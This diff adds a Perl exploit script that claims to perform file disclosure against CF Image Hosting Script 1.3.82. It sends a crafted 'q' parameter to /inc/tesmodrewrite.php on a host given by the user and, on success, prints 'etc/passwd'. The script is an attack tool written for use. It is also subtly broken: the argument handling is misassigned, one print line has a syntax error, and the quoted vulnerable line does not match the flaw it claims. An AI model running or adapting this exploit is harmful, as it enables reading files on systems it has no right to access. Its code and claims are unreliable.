@@ -1,0 +1,50 @@
+#!/usr/bin/perl
+
+#CF Image Hosting Script 1.3.82 File Disclosure Exploit
+#Bugfounder and Exploitcoder: bd0rk
+#Contact: www.sohcrew.school-of-hack.net
+#eMail: bd0rk[at]hackermail.com
+#Affected-Software: CF Image Hosting Script 1.3.82
+#Vendor: http://www.phpkode.com
+#Download: http://phpkode.com/download/p/CF_Image_Hosting_v1.3.zip
+
+#Vulnerable Code in /inc/tesmodrewrite.php line 28
+#echo "Current URL: " . $_GET['q'];
+
+#Tested on Ubuntu-Linux
+
+use LWP::Simple;
+use LWP::UserAgent;
+
+sub help()
+{
+print "Sploit: perl $0 [targethost] /dir/\n";
+}
+
+print "\nCF Image Hosting Script 1.3.82 File Disclosure Exploit\n";
+print "\ By bd0rk bd0rk[at]hackermail.com\n";
+
+($inc, $targethost, $dir, $file,) = @ARGV;
+
+$inc="/inc/";
+$file="tesmodrewrite.php?q=[APossibleFile]";
+my $url = "http://".$targethost.$dir.$inc.$file;
+
+my $useragent = LWP::UserAgent->new();
+my $req = $useragent->get($url,":content_file"=>"[APossibleFile]");
+
+if ($req->is_success)
+
+{
+
+print "$url <= H3h3!\n\n";
+print "etc/passwd\n";
+
+exit();
+}
+else
+{
+print "Sploit $url Mhhh!\n[!]".$req->status_line.\n";
+
+exit();
+}
